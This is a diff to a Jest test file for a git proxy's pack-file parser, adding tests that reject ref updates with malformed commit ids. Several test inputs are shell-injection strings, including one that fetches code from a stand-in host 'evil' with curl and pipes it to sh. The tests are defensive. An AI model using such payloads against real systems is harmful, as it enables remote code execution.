@@ -33,6 +33,9 @@ import { Action } from '../src/proxy/actions/Action';
 import { Request } from 'express';
 import { Step } from '../src/proxy/actions/Step';
 
+const OLD_HASH = 'a'.repeat(40);
+const NEW_HASH = 'b'.repeat(40);
+
 /**
  * Creates a simplified sample PACK buffer for testing.
  * @param {number} numEntries - Number of entries in the PACK file.
@@ -432,8 +435,8 @@ describe('parsePackFile', () => {
 
     it('should add error step if multiple ref updates found', async () => {
       const packetLines = [
-        'oldhash1 newhash1 refs/heads/main\0caps\n',
-        'oldhash2 newhash2 refs/heads/develop\0caps\n',
+        `${OLD_HASH} ${NEW_HASH} refs/heads/main\0caps\n`,
+        `${OLD_HASH} ${NEW_HASH} refs/heads/develop\0caps\n`,
       ];
       req.body = createPacketLineBuffer(packetLines);
       const result = await exec(req, action);
@@ -448,7 +451,7 @@ describe('parsePackFile', () => {
     });
 
     it('should add error step if extra part in ref update', async () => {
-      const packetLines = ['oldhash1 newhash1 extra-part refs/heads/main\0caps\n'];
+      const packetLines = [`${OLD_HASH} ${NEW_HASH} extra-part refs/heads/main\0caps\n`];
       req.body = createPacketLineBuffer(packetLines);
       const result = await exec(req, action);
 
@@ -459,6 +462,39 @@ describe('parsePackFile', () => {
       expect(step.errorMessage).toContain('Invalid ref update format');
       expect(step.logs[0]).toContain('Invalid number of parts in ref update');
       expect(step.logs[1]).toContain('Expected 3, but got 4');
+    });
+
+    it.each([
+      ['shell payload in new commit', OLD_HASH, "abc'$(touch${IFS}/tmp/pwned)'"],
+      ['git revision expression with payload', OLD_HASH, ":/.*|x'$(curl${IFS}evil/x|sh)'x"],
+      ['shell payload in old commit', "abc'$(id)'", NEW_HASH],
+      ['abbreviated hash', OLD_HASH, 'b'.repeat(7)],
+      ['uppercase hex', OLD_HASH, 'B'.repeat(40)],
+      ['wrong length', OLD_HASH, 'b'.repeat(41)],
+    ])(
+      'should block a ref update with an invalid commit id (%s)',
+      async (_, oldCommit, newCommit) => {
+        req.body = createPacketLineBuffer([`${oldCommit} ${newCommit} refs/heads/main\0caps\n`]);
+        const result = await exec(req, action);
+
+        expect(result).toBe(action);
+        const step = action.steps[0];
+        expect(step.error).toBe(true);
+        expect(step.errorMessage).toContain('Invalid commit id in ref update');
+        expect(action.setCommit).not.toHaveBeenCalled();
+        expect(action.commitTo).not.toBe(newCommit);
+      },
+    );
+
+    it('should accept SHA-256 commit ids in the ref update', async () => {
+      const oldCommit = 'c'.repeat(64);
+      const newCommit = 'd'.repeat(64);
+      req.body = createPacketLineBuffer([`${oldCommit} ${newCommit} refs/heads/main\0caps\n`]);
+      const result = await exec(req, action);
+
+      const step = result.steps[0];
+      expect(step.errorMessage).not.toContain('Invalid commit id');
+      expect(step.errorMessage).toContain('PACK data is missing');
     });
 
     it('should add error step if PACK data is missing', async () => {
@@ -757,7 +793,7 @@ describe('parsePackFile', () => {
         'tree 123\ntree 456\nparent 789\nauthor Test Author <test@example.com> 1234567890 +0000\ncommitter Test Committer <committer@example.com> 1234567890 +0000\n\nCommit message';
       const samplePackBuffer = createSamplePackBuffer(1, commitContent, 1);
       req.body = Buffer.concat([
-        createPacketLineBuffer(['oldhash1 newhash1 refs/heads/main\0caps\n']),
+        createPacketLineBuffer([`${OLD_HASH} ${NEW_HASH} refs/heads/main\0caps\n`]),
         samplePackBuffer,
       ]);
       const result = await exec(req, action);
@@ -772,7 +808,7 @@ describe('parsePackFile', () => {
         'tree 123\nauthor Test Author <test@example.com> 1234567890 +0000\nauthor Test Author <test@example.com> 1234567890 +0000\nparent 789\ncommitter Test Committer <committer@example.com> 1234567890 +0000\n\nCommit message';
       const samplePackBuffer = createSamplePackBuffer(1, commitContent, 1);
       req.body = Buffer.concat([
-        createPacketLineBuffer(['oldhash1 newhash1 refs/heads/main\0caps\n']),
+        createPacketLineBuffer([`${OLD_HASH} ${NEW_HASH} refs/heads/main\0caps\n`]),
         samplePackBuffer,
       ]);
       const result = await exec(req, action);
@@ -787,7 +823,7 @@ describe('parsePackFile', () => {
         'tree 123\nauthor Test Author <test@example.com> 1234567890 +0000\ncommitter Test Committer <committer@example.com> 1234567890 +0000\ncommitter Test Committer <committer@example.com> 1234567890 +0000\nparent 789\n\nCommit message';
       const samplePackBuffer = createSamplePackBuffer(1, commitContent, 1);
       req.body = Buffer.concat([
-        createPacketLineBuffer(['oldhash1 newhash1 refs/heads/main\0caps\n']),
+        createPacketLineBuffer([`${OLD_HASH} ${NEW_HASH} refs/heads/main\0caps\n`]),
         samplePackBuffer,
       ]);
       const result = await exec(req, action);
@@ -802,7 +838,7 @@ describe('parsePackFile', () => {
         'tree 123\nparent 789\nauthor Test Author <test@example.com> 1234567890 +0000\ncommitter Test Committer <committer@example.com> 1234567890 +0000\n\nCommit message\n\n\n';
       const samplePackBuffer = createSamplePackBuffer(1, commitContent, 1);
       req.body = Buffer.concat([
-        createPacketLineBuffer(['oldhash1 newhash1 refs/heads/main\0caps\n']),
+        createPacketLineBuffer([`${OLD_HASH} ${NEW_HASH} refs/heads/main\0caps\n`]),
         samplePackBuffer,
       ]);
       const result = await exec(req, action);
@@ -818,7 +854,7 @@ describe('parsePackFile', () => {
         'tree 123\nparent 789\nauthor Test Author <test@example.com> 1234567890 +0000\ncommitter Test Committer <committer@example.com> 1234567890 +0000\n\nCommit message   ';
       const samplePackBuffer = createSamplePackBuffer(1, commitContent, 1);
       req.body = Buffer.concat([
-        createPacketLineBuffer(['oldhash1 newhash1 refs/heads/main\0caps\n']),
+        createPacketLineBuffer([`${OLD_HASH} ${NEW_HASH} refs/heads/main\0caps\n`]),
         samplePackBuffer,
       ]);
       const result = await exec(req, action);
@@ -833,7 +869,7 @@ describe('parsePackFile', () => {
       const commitContent = 'tree 123';
       const samplePackBuffer = createSamplePackBuffer(1, commitContent, 1);
       req.body = Buffer.concat([
-        createPacketLineBuffer(['oldhash1 newhash1 refs/heads/main\0caps\n']),
+        createPacketLineBuffer([`${OLD_HASH} ${NEW_HASH} refs/heads/main\0caps\n`]),
         samplePackBuffer,
       ]);
       const result = await exec(req, action);
